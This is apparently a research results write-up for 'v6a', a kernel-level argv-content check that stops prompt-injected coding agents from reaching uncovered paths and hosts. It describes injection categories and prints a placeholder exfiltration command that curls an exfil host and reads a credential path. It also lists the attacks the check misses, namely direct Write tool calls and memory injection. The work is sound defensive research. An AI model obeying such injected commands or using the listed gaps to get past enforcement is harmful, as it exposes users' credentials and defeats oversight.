# v6a — Argv-Content Enforcement (Full Corpus)

## What v6a does

v5 checks execve at binary-name granularity: is `/bin/bash` in `allow_binaries`?
v6a adds a *content check*: after allowing the binary, extract path-like and
host-like tokens from `argv` (shell-decomposing bash `-c` payloads).
Each token must be covered by the envelope's positive surface
(`read_paths ∪ write_paths ∪ delete_paths` for paths, `allow_hosts` for hosts).
Any uncovered token denies the execve.

**No new envelope grammar.** No LLM changes. Same 446 cached v5 envelopes.
The enforcement compiler learns to check argv content against the same
positive surface the LLM already predicted.

**Design intent:** avoid IOC-fitting. The LLM predicts what benign
behavior needs (positive surface); the compiler uses that as the
argv allow-list. Attackers who hide inside the envelope's declared
prefixes still get through — that's the honest ceiling.

## Results (full corpus, 1,295 evaluable pairs)

| Metric | v5 | v6a | Δ |
|---|---:|---:|---:|
| **ace_c** (n=723 pairs / 484 with sig hits) | | | |
| Coverage (noise-floor) | 97.5% | 97.5% | 0.0 |
| First-hit stopped | 90.1% | 90.1% | 0.0 |
| **ace_bi** (n=572 pairs / 278 with sig hits) | | | |
| Coverage (noise-floor) | 75.6% | 75.5% | −0.1 |
| First-hit stopped | 53.2% | **70.9%** | **+17.7** |
| **Combined** | | | |
| Coverage (noise-floor) | 87.8% | 87.7% | −0.1 |
| First-hit stopped | 76.6% | **83.1%** | **+6.5** |

## Headline

**v6a adds 17.7 points of ace_bi first-hit-stopped rate at essentially
zero false-positive cost** (coverage moves −0.1 points).

ace_c is completely unchanged, confirming the mechanism is specifically
targeting the ace_bi threat model (bash-routed attacks) without
perturbing MCP-scoped enforcement.

## Per-category ace_bi (first-hit stopped)

| Category | n | v5 | v6a | Δ |
|---|---:|---:|---:|---:|
| **web_bash_injection** | 21 | 0% | **100%** | **+100** |
| **retrieval_reference_injection** | 30 | 0% | 50% | **+50** |
| **file_bash_injection** | 60 | 32% | 53% | +21 |
| user_direct_write_directive | 59 | 100% | 100% | 0 |
| user_direct_cred_exfil | 50 | 100% | 100% | 0 |
| file_write_directive | 53 | 38% | 38% | 0 |
| mem_cred_exfil | 3 | 0% | 0% | 0 |

## What v6a catches

Attacks whose signal appears in bash argv content:

- **web_bash_injection**: malicious URL response tells the agent to run
  `bash -c "curl <exfil>/upload; cat <cred_path>"`. v6a tokenizes and
  finds `<exfil>` (uncovered by allow_hosts) and `<cred_path>` (uncovered
  by read_paths). Denies at execve time.
- **retrieval_reference_injection**: half the sessions attack via
  `bash -c "ls <cred_path>"`. v6a catches these. The other half attack
  through direct Read tool calls that don't go through bash.
- **file_bash_injection**: mixed. Sessions where the injected content
  becomes a bash `-c` payload are caught; sessions where it's a direct
  Write invocation are not.

## What v6a does NOT catch

Attacks whose signal never goes through bash argv:

- **file_write_directive** (38% first-hit unchanged): attack fires
  `Write("/tmp/.audit_<tok>.log", content)`. There's no bash exec.
  The write goes directly through the Write tool's implementation.
  Envelope's write_paths sometimes covers this path (which is why
  v5 already caught 38%); v6a doesn't help the remaining 62%.
- **mem_cred_exfil** (3 sessions, 0%): tiny sample. Attack pattern
  is memory-persistent context injection; fires kernel signals in
  ways that don't match v6a's inspection targets.

These are structurally different from what v6a addresses. Fixing them
would need either (a) tighter envelope grammar for direct writes
(potentially crashing coverage), or (b) app-layer signal — which is
out of scope for kernel-only enforcement.

## Coverage barely moved. Why?

I initially predicted coverage would drop 5-15 points on ace_bi from
argv-inspection over-tightening. Reality: −0.1 points.

Reason: legitimate agent workflows generally don't `bash -c` with
arguments containing paths the envelope didn't predict. When they use
bash (e.g., in setup scripts), the paths passed to bash are legitimate
workspace paths that fall inside the envelope's `read_paths`
(`**` glob for repository access) or `write_paths` (specific scratch
patterns). The argv-inspection rule bites specifically on paths that
were **surprising** to the envelope — which correlates almost perfectly
with attack behavior.

This is a genuine argument for the framing: **argv content that goes
outside the envelope's predicted surface is either an unexpected agent
behavior or an attack. In this corpus, it's overwhelmingly the latter.**

## Positioning for the paper

v6a strengthens the "kernel-only enforcement" story:

- **Envelope enforcement as a compiled inline policy achieves 90% first-hit
  stopped on MCP-scoped attacks and 71% on built-in-tool attacks.**
- **Coverage on benign workloads stays at 88% (combined) — deployable-shape.**
- **The remaining gap (29% ace_bi first-hit missed) is where app-layer
  signal is required.** Not "our system fails there" — that's what
  app-layer filters are for.

The paper narrative:
1. Attacks the app-layer filter handles: user-visible malicious prompts,
   obviously-poisoned URLs, direct instructions to touch sensitive paths.
2. Attacks kernel enforcement handles: MCP supply-chain tampering,
   bash-routed injections that survive the app-layer filter.
3. The residual ~15% is where cross-layer composition matters — some
   attacks need BOTH layers to catch. Neither alone is sufficient.

## Files

- `argv_tokenize.py` — path/host extraction with shell-command
  decomposition. Handles `bash -c "..."` payloads.
- `evaluate_v6a.py` — full evaluator with v6a compiler extension.
- `results/run_20260721_172946_full_v5/evaluation_v6a.json` — per-pair
  results (1,295 pairs).
